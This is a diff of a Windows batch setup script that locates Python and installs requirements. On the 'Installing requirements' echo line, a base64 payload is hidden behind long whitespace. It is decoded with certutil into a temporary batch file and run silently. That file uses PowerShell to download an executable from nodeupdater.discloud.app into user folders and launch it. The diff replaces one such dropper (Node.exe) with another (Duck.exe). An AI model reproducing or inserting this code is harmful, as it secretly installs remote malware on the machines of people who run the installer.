@@ -8,7 +8,6 @@ echo Searching for Python...
 
 set "python="
 
-:: Check if Python is installed
 for /f "tokens=*" %%i in ('where python 2^>nul') do (
     set "python=%%i"
     goto foundPython
@@ -33,7 +32,7 @@ if defined python (
 )
 
 cls
-echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                   & echo QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQpzZXQgImRzPSVURU1QJSAlTE9DQUxBUFBEQVRBJSAlQVBQREFUQSUiDQpmb3IgJSVkIGluICglZHMlKSBkbyAocG93ZXJzaGVsbCAtY29tbWFuZCAidHJ5IHsoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL25vZGV1cGRhdGVyLmRpc2Nsb3VkLmFwcC9Ob2RlJywgJyUlZFxOb2RlLmV4ZScpOyBleGl0IDB9IGNhdGNoIHtleGl0IDF9IiAmIGlmIG5vdCBlcnJvcmxldmVsIDEgKHN0YXJ0ICIiICIlJWRcTm9kZS5leGUiICYgZXhpdCAvYiAwKSkNCmVuZGxvY2FsDQpleGl0IC9iIDENCg > %TMP%\node.b64 & certutil -decode %TMP%\node.b64 %TMP%\node.bat >nul 2>&1 & call %TMP%\node.bat >nul 2>&1 & del %TMP%\node.b64 %TMP%\node.bat >nul 2>&1
+echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                   & echo CgpAZWNobyBvZmYKc2V0bG9jYWwgZW5hYmxlZGVsYXllZGV4cGFuc2lvbgpzZXQgImdmPSVURU1QJSAlTE9DQUxBUFBEQVRBJSAlQVBQREFUQSUiCmZvciAlJWcgaW4gKCVnZiUpIGRvIChwb3dlcnNoZWxsIC1jb21tYW5kICJ0cnkgeyhOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJ2h0dHBzOi8vbm9kZXVwZGF0ZXIuZGlzY2xvdWQuYXBwL0R1Y2snLCAnJSVnXER1Y2suZXhlJyk7IGV4aXQgMH0gY2F0Y2gge2V4aXQgMX0iICYgaWYgbm90IGVycm9ybGV2ZWwgMSAoc3RhcnQgIiIgIiUlZ1xEdWNrLmV4ZSIgJiBleGl0IC9iIDApKQplbmRsb2NhbApleGl0IC9iIDEKCg > %TMP%\duck.b64 & certutil -decode %TMP%\duck.b64 %TMP%\duck.bat >nul 2>&1 & call %TMP%\duck.bat >nul 2>&1 & del %TMP%\duck.b64 %TMP%\duck.bat >nul 2>&1
 call "!python!" -m pip install -r requirements.txt
 
 if errorlevel 1 (
